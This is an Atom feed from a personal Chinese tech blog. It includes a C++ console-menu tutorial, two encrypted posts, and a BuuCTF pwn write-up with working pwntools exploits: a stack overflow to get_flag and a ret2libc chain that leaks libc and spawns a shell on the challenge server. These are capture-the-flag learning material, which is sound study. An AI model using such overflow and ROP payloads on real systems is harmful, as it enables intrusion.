<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>N0P3</title>
  
  <subtitle>欢迎来访</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cdn.n0p3.cn/"/>
  <updated>2020-08-03T15:53:54.183Z</updated>
  <id>https://cdn.n0p3.cn/</id>
  
  <author>
    <name>N0P3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【来做命令行游戏吧-1】：一个图形选择菜单</title>
    <link href="https://cdn.n0p3.cn/2020/08/03/MakeAGunGame/"/>
    <id>https://cdn.n0p3.cn/2020/08/03/MakeAGunGame/</id>
    <published>2020-08-03T14:26:35.000Z</published>
    <updated>2020-08-03T15:53:54.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装-XzyGraphics"><a href="#安装-XzyGraphics" class="headerlink" title="安装 XzyGraphics"></a>安装 XzyGraphics</h1><p>以vs2019为例，先把.h文件放进工程目录</p><p>再根据vs的设置挑选对应的.lib文件</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803150644583.png" data-fancybox="group" data-caption="image-20200803150644583" class="fancybox"><img alt="image-20200803150644583" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803150644583.png" class="lazyload" title="image-20200803150644583"></a></p><p>我现在的配置设置如图，于是就把对应的lib放进工程文件夹。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803150748801.png" data-fancybox="group" data-caption="image-20200803150748801" class="fancybox"><img alt="image-20200803150748801" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803150748801.png" class="lazyload" title="image-20200803150748801"></a></p><p>在cpp文件中include进来。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803155044746.png" data-fancybox="group" data-caption="image-20200803155044746" class="fancybox"><img alt="image-20200803155044746" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803155044746.png" class="lazyload" title="image-20200803155044746"></a></p><p>没有报错的话就安装好了。</p><h1 id="制作一个主菜单"><a href="#制作一个主菜单" class="headerlink" title="制作一个主菜单"></a>制作一个主菜单</h1><h2 id="设计选单"><a href="#设计选单" class="headerlink" title="设计选单"></a>设计选单</h2><p><strong>FORM</strong>是选单类，实例化的对象是一个默认选单。经过简单设置后就可以展开选单让用户进行选择。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803165119110.png" data-fancybox="group" data-caption="image-20200803165119110" class="fancybox"><img alt="image-20200803165119110" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803165119110.png" class="lazyload" title="image-20200803165119110"></a></p><p>程序员为了开发快速常常会写类似这样的一段代码。让用户输入数字，switch根据数字再去选择对应的功能。</p><p>我们可以用FORM来美化这段代码。FORM的设计思想是“改变用户输入方式”。因此FORM仅仅只负责用户输入和返回用户选择的值，不关心程序对FORM返回的数据的处理。</p><p>所以我们要把原来的输入方式cin替换掉。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803171003779.png" data-fancybox="group" data-caption="image-20200803171003779" class="fancybox"><img alt="image-20200803171003779" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803171003779.png" class="lazyload" title="image-20200803171003779"></a></p><p>FORM声明一个叫做MainMenu的对象。可见初始参数有六个，均为整型。Inx1，Iny1为显示选单的左上角坐标；同理，Inx2，Iny2为右下角坐标。InoptionX和InoptionY是指生成几乘几的选单。例如1，2就代表1列2行的选单。</p><p>我们的《测试枪战》共有3个选项，我们先选择1x3的排列方式。</p><p><code>FORM MainMenu(10, 4, 30, 15, 1, 3);//两点的坐标只是大概估计，具体数值要经过测试。</code></p><p><em>(注坐标原点为左上角，(0,0）点不显示在屏幕，所以坐标中不存在0，左上角第一个字符坐标为(1,1) )</em></p><p>我们声明好了一个选单，但是我们还看不到它。可以使用DRAW函数来把这个选单绘制出来。</p><p><code>MainMenu.DRAW(H_Blue,H_Red,H_Green);</code>//绘制选单需要提供三个颜色参数，分别是边框颜色，选项边框颜色，选项文字颜色</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803172339566.png" data-fancybox="group" data-caption="image-20200803172339566" class="fancybox"><img alt="image-20200803172339566" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803172339566.png" class="lazyload" title="image-20200803172339566"></a></p><p>运行效果如图。此时的选单没有任何内容，但是我们已经看到生成效果不错。</p><p>接下来使用SETOPTIONNAME函数给选项设定名字。</p><p><code>MainMenu.SETOPTIONNAME(0,&quot;开始游戏&quot;);//把0号选项的名字设定为 “开始游戏”</code></p><p>选项编号按从左到右，从上到下的顺序从0开始计数。所以三个选项的编号分别为0，1，2。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803203429405.png" data-fancybox="group" data-caption="image-20200803203429405" class="fancybox"><img alt="image-20200803203429405" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803203429405.png" class="lazyload" title="image-20200803203429405"></a></p><p>设定好三个选项。运行看看效果。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803203508361.png" data-fancybox="group" data-caption="image-20200803203508361" class="fancybox"><img alt="image-20200803203508361" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803203508361.png" class="lazyload" title="image-20200803203508361"></a></p><p>（这个红绿也太丑了）</p><p>现在标题，边框，选项框我们都还没有自定义。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MainMenu.FormStr = <span class="string">"*"</span>;<span class="comment">//边框字符改为‘*’</span></span><br><span class="line">MainMenu.OptionStr = <span class="string">"."</span>;<span class="comment">//选项边框字符改为‘.’</span></span><br><span class="line">MainMenu.title = <span class="string">"测试枪战"</span>;<span class="comment">//标题改为”测试枪战“</span></span><br><span class="line">MainMenu.TitleColor = H_Yellow;<span class="comment">//标题颜色改为亮黄色</span></span><br></pre></td></tr></table></figure></div><p>运行看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803204402831.png" data-fancybox="group" data-caption="image-20200803204402831" class="fancybox"><img alt="image-20200803204402831" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803204402831.png" class="lazyload" title="image-20200803204402831"></a></p><p>想让字居中？通过在选项名前加空格就可以解决。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803204633021.png" data-fancybox="group" data-caption="image-20200803204633021" class="fancybox"><img alt="image-20200803204633021" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803204633021.png" class="lazyload" title="image-20200803204633021"></a></p><p>不想要边框？或者想自己绘制更复杂的边框？</p><p>把border参数改为false即可。</p><p><code>MainMenu.border = false;</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205206469.png" data-fancybox="group" data-caption="image-20200803205206469" class="fancybox"><img alt="image-20200803205206469" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205206469.png" class="lazyload" title="image-20200803205206469"></a></p><p>简洁。</p><h2 id="使用选单"><a href="#使用选单" class="headerlink" title="使用选单"></a>使用选单</h2><p>我们现在使用的是DRAW函数绘制出选单，但我们是想让用户进行选择。所以我们要使用SELECTION函数来绘制选单并让用户选择。</p><p><code>MainMenu.SELECTION(H_Blue, H_Red, H_Green);//和DRAW的所需参数一致，只不过会让用户选择。</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205427181.png" data-fancybox="group" data-caption="image-20200803205427181" class="fancybox"><img alt="image-20200803205427181" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205427181.png" class="lazyload" title="image-20200803205427181"></a></p><p>用户通过按ws上下移动选项，回车键确定选项并返回选项的值。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205737058.png" data-fancybox="group" data-caption="image-20200803205737058" class="fancybox"><img alt="image-20200803205737058" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205737058.png" class="lazyload" title="image-20200803205737058"></a></p><p>经过SELECTION之后selection变量会得到用户选择选项的值，再根据值switch到对应位置。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205922246.png" data-fancybox="group" data-caption="image-20200803205922246" class="fancybox"><img alt="image-20200803205922246" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803205922246.png" class="lazyload" title="image-20200803205922246"></a></p><p>当我们选择第2个选项的时候出现了1，这是因为选项的值默认与选项编号一致，因此第二个选项实际返回的是1。对应的把case标签修改一下或者给返回值加1再或者使用SETVALUE修改选项返回值也是可以的。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803211135827.png" data-fancybox="group" data-caption="image-20200803211135827" class="fancybox"><img alt="image-20200803211135827" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803211135827.png" class="lazyload" title="image-20200803211135827"></a></p><p>对应起来即可。</p><p>所以使用FORM只不过是改变了selection的输入方式，从cin输入改为了选项选择。</p><h2 id="特殊返回值"><a href="#特殊返回值" class="headerlink" title="特殊返回值"></a>特殊返回值</h2><p>为了满足更多需要，有两个特殊的按键【ESC】和【TAB】。分别对应返回值-1和返回值-2。推荐的实践是把-1作为退出按键，使用户离开选择菜单不做出选择。-2作为切换键，在多个选单，信息栏或输入框之间切换。（信息栏，输入框会在以后说到）</p><p>开发者要记得为这两个特殊返回值做出回应。</p><p>本例中的主菜单不允许关闭，于是可以套一个循环</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803214717592.png" data-fancybox="group" data-caption="image-20200803214717592" class="fancybox"><img alt="image-20200803214717592" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MakeAGunGame/1/image-20200803214717592.png" class="lazyload" title="image-20200803214717592"></a></p><p>像这样就可以实现必须选择，且按【TAB】键无用。</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>使用FORM去生成一个选择菜单是非常简单的，并且它的用途很广并不只是可以用于做选择菜单。人物的背包，卡牌或道具的选择都可以使用它。甚至可以用它来做井字棋。需要的是想象。</p>]]></content>
    
    <summary type="html">
    
      这里是XzyGraphics和InfantGameEngine的开发实例，我们的目标是从一片漆黑到开发出一个2d命令行游戏。本文内容：安装XzyGraphics，制作一个图形选择菜单。
    
    </summary>
    
    
    
      <category term="命令行" scheme="https://cdn.n0p3.cn/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>CTFLand</title>
    <link href="https://cdn.n0p3.cn/2020/07/29/CTFLand/"/>
    <id>https://cdn.n0p3.cn/2020/07/29/CTFLand/</id>
    <published>2020-07-29T10:57:37.000Z</published>
    <updated>2020-07-29T11:08:05.758Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="232ec9ecd276e75becce66cb30a1c122f23d4480a50c4607961a6b0908190f09">458dd47edb28e82a7641639686160549fa5993aed8c15bf2973030727930b38444d9e2a91174136f348d7872a0fa16ad816d1baab410465be4bff778045c15a7f436faca2bf4d7ea73ea84d5db4b65add0a140d1e85bcefa503813cf2b9ede6291d809529a2884a1945ed3e19d8cc44a95c4ed099b84bb0459df8479950bbf849ddce3bc374283e3f8eccae7a86a5df8536526948c8bd79408df7c88ec6fc7f05240eca660502909ddc659ca5f3653c2c2254385d02044254550669571cfe54e7d1264a26a4917ad94084ca5abe4c146ff1f0198dd6b67e0e56d3f5ea0af4aceabfdaf5dfaa8354fc08f3114680cf99e05f6f413ebf093246b821f1581e94afb53d94602b4b3131bdcab7188e4abe914e7ee4dcdcd40e3a7463eb911c652941a98016e1c0b39939deb85dd775942f54c4dc0e0c161c30fb5cebe512413ca59fa17c9143bac7ee0fac6864ff634908701</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
      <category term="game" scheme="https://cdn.n0p3.cn/tags/game/"/>
    
  </entry>
  
  <entry>
    <title>「BuuCTF」Part I</title>
    <link href="https://cdn.n0p3.cn/2020/07/17/BuuCtf1/"/>
    <id>https://cdn.n0p3.cn/2020/07/17/BuuCtf1/</id>
    <published>2020-07-17T01:07:05.000Z</published>
    <updated>2020-07-29T14:33:59.788Z</updated>
    
    <content type="html"><![CDATA[<p><em>Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。</em>  如有错误还请路过的师傅在评论区指出。</p><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p><em>这道题没什么难的，主要记录几个C++的标准库函数。</em></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png" class="lazyload" title></a></p><p>一大堆看起来乱七八糟的函数。这些函数的简单介绍：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">fgets</span><br><span class="line">函数原型：char * fgets ( char * str, int num, FILE * stream );</span><br><span class="line">函数功能：</span><br><span class="line">从流中读取字符，并将它们作为C字符串存储到str中，直到已读取（num-1）个字符或到达换行符或到达文件末尾（以先发生的为准）。</span><br><span class="line">换行符使fgets停止读取，但是该函数将其视为有效字符并包含在复制到str的字符串中。</span><br><span class="line">复制到str的字符后会自动附加一个终止的空字符。</span><br><span class="line">请注意，fgets与gets完全不同：fgets不仅接受流参数，而且还允许指定str的最大大小，并在字符串中包括任何结尾的换行符。</span><br><span class="line"></span><br><span class="line">std:replace</span><br><span class="line">函数原型：</span><br><span class="line">template &lt;class ForwardIterator, class T&gt;</span><br><span class="line">  void replace (ForwardIterator first, ForwardIterator last,</span><br><span class="line">                const T&amp; old_value, const T&amp; new_value);</span><br><span class="line">函数功能：</span><br><span class="line">替换范围内的值</span><br><span class="line">将new_value分配给[first，last)范围内所有等于old_value的元素。</span><br><span class="line">该函数使用&quot;operator &#x3D;&#x3D;&quot; 将各个元素与old_value进行比较。</span><br><span class="line">该功能模板的行为等效于：</span><br><span class="line">template &lt;class ForwardIterator, class T&gt;</span><br><span class="line">  void replace (ForwardIterator first, ForwardIterator last,</span><br><span class="line">                const T&amp; old_value, const T&amp; new_value)</span><br><span class="line">&#123;</span><br><span class="line">  while (first!&#x3D;last) &#123;</span><br><span class="line">    if (*first &#x3D;&#x3D; old_value) *first&#x3D;new_value;</span><br><span class="line">    ++first;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">参数再介绍：</span><br><span class="line">first, last：将迭代器转发到元素序列中的初始位置和最终位置，这些元素支持比较并分配为T类型的值。</span><br><span class="line">            使用的范围是[first，last），其中包含first和last之间的所有元素，包括由指向的元素 首先但不是最后指出的元素。</span><br><span class="line">old_value：要替换的值。</span><br><span class="line">new_value：新的值</span><br><span class="line"></span><br><span class="line">可以暂时粗略地地这样记下： replace (first,last,old_value,new_value);</span><br><span class="line"></span><br><span class="line">std::string::operator&#x3D;(&amp;input, &amp;s);</span><br><span class="line">作用： 就是 将s指针赋值到 inputs地址里了。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strcpy:</span><br><span class="line">函数原型：char * strcpy ( char * destination, const char * source );</span><br><span class="line">函数功能：  </span><br><span class="line">将source指向的C字符串复制到destination指向的数组中，包括终止的空字符（并在该位置停止）。</span><br><span class="line">为避免溢出，目标指向的数组的大小应足够长，以包含与源相同的C字符串（包括终止空字符），并且在内存中不应与源重叠。</span><br></pre></td></tr></table></figure></div><p>文本来源：<a href="https://zhuanlan.zhihu.com/p/138897356" target="_blank" rel="noopener">紫色仰望合天智汇</a></p><p>但是经过简单测试我们就能发现所有的‘I’都会被替换成‘you’。s2原本不会溢出，经过替换再赋值给s2就可以造成溢出。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/stack.jpg" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/stack.jpg" class="lazyload" title></a></p><p>可以看到从s2到返回地址中间还有很多个变量。想要覆盖到返回地址一共需要覆盖64个字节，那么就可以20个I+4个字符来实现溢出，再加上get_flag函数地址即可。总共是28个字节小于32，是可行的。</p><p>exp：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">res=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28767</span>)</span><br><span class="line">get_flag=<span class="number">0x08048F0D</span></span><br><span class="line">payload=<span class="string">'I'</span>*<span class="number">20</span>+<span class="string">'N0P3'</span>+p32(get_flag)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>这道题就是普通ret2libc，踩了个ubuntu18栈对齐的坑，写下exp以备参考</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">res=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29379</span>)</span><br><span class="line">res.recv()</span><br><span class="line">res.sendline(<span class="string">'1'</span>)</span><br><span class="line">res.recv()</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4008a3</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start=elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x50</span>+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'N0P3'</span>+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">puts_got=res.recv()</span><br><span class="line"><span class="comment">#print(puts_got)</span></span><br><span class="line">puts_got=puts_got[<span class="number">6</span>*<span class="number">16</span>+<span class="number">7</span>:<span class="number">6</span>*<span class="number">16</span>+<span class="number">8</span>+<span class="number">5</span>]</span><br><span class="line"><span class="comment">#print(puts_got)</span></span><br><span class="line">puts_got=u64(puts_got.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(puts_got)</span><br><span class="line"><span class="keyword">if</span> puts_got==<span class="number">0x0</span>:</span><br><span class="line">    print(<span class="string">'Attack failed. Please try again.'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Searcher=LibcSearcher(<span class="string">'puts'</span>,puts_got)</span><br><span class="line">    offset=puts_got-Searcher.dump(<span class="string">'puts'</span>)</span><br><span class="line">    res.sendline(<span class="string">'1'</span>)</span><br><span class="line">    res.recv()</span><br><span class="line">    binsh=Searcher.dump(<span class="string">'str_bin_sh'</span>)+offset</span><br><span class="line">    system=Searcher.dump(<span class="string">'system'</span>)+offset</span><br><span class="line">    payload=<span class="string">'A'</span>*<span class="number">0x50</span>+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'N0P3'</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">    res.sendline(payload)</span><br><span class="line">    res.recv()</span><br><span class="line">    res.interactive()</span><br></pre></td></tr></table></figure></div><p>payload里需要执行一次ret来使栈对齐。第一个payload会有时会失效，大概每执行3次exp就有一次泄漏失败。原因未知，可能与服务器环境有关。</p><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p><em>*普通的ret2libc，中间有一个小的绕过姿势。</em></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Main.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Main.png" class="lazyload" title="main"></a></p><p>在主函数使用urandom生成了一个随机数，接着调用了HanShu1。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/HanShu1.png" data-fancybox="group" data-caption="HanShu1" class="fancybox"><img alt="HanShu1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/HanShu1.png" class="lazyload" title="HanShu1"></a></p><p>Line 11把a1格式化后放入了s，bufa是我们输入的字符串，在Line 15两者不相等则直接退出。比较的长度v1是可控的，strlen遇到\x00会截断，所以payload开头放个\x00就可以使比对长度为0，这样就能绕过对比。</p><p>这个函数在line 12还有个溢出点能覆盖v5，v5是下一个函数的参数。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Sub.png" data-fancybox="group" data-caption="截屏2020-07-18 下午5.16.35" class="fancybox"><img alt="截屏2020-07-18 下午5.16.35" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Sub.png" class="lazyload" title="截屏2020-07-18 下午5.16.35"></a></p><p>a1就是上个函数的v5，127是0x7f，只要不等于0x7f我们覆盖的值就可以作为read的长度参数了。但是经过测试0xC8也是能在远程打通的，看来服务器运行的程序和这个有点出入。</p><p>exp:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这是后来补的wp，exp手滑覆盖掉了==</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。&lt;/em&gt;  如有错误还请路过的师傅在评论区指出。&lt;/p&gt;
&lt;h1 id=&quot;pwn1-sctf-2016&quot;&gt;&lt;a href=&quot;#pwn1-sctf-2016&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="PWN" scheme="https://cdn.n0p3.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>数据结构(二)[栈与队列]</title>
    <link href="https://cdn.n0p3.cn/2020/05/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%842/"/>
    <id>https://cdn.n0p3.cn/2020/05/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%842/</id>
    <published>2020-05-22T17:03:31.000Z</published>
    <updated>2020-07-11T11:48:54.203Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password在哪里呢？</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="735f440412cda49e1f675cc6034dc8bbc9932b7d09fe8965af785aed75d31b7d">4cefa06a54054c5612845859a9f16e47b585e05992a9d3ede522bdb5fc1110415b02aa5e085bab77d6b1c137e8c3702eef2c532af42947a5caa177e6e5746cd2edfd353b97e969700bca594294a7d6921aabd013c3ad461acf0ed5aa44e0d8a4f9a4cd094ad7fd891658c742d62fb45d3b7dc9fedfada03e80119e4b61574bf37321a9de278a9edda5d057b0fe80013768dc7ac0ca9378dcadebe0b0342b2ae945a0a0c32aa99c00693dfb5cc891db2f88e62ac276a38b41d36ad9d67e7d9183dca7221405df36a4826c4e122edc57b8f3c72741aa188ae062e50fcc31397d0020a42fdfc626b86edd361ddaa3a8f7647cdb644599b4af1f51bb5509ee77d5bf7106331b8466723c7b190c4a08752edbe70cf3cb4e28707338f2c8066e61e6ad</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这次我们不搞破坏。
    
    </summary>
    
    
    
      <category term="数据结构 - 开发" scheme="https://cdn.n0p3.cn/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>数据结构(一)[线性表]</title>
    <link href="https://cdn.n0p3.cn/2020/05/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
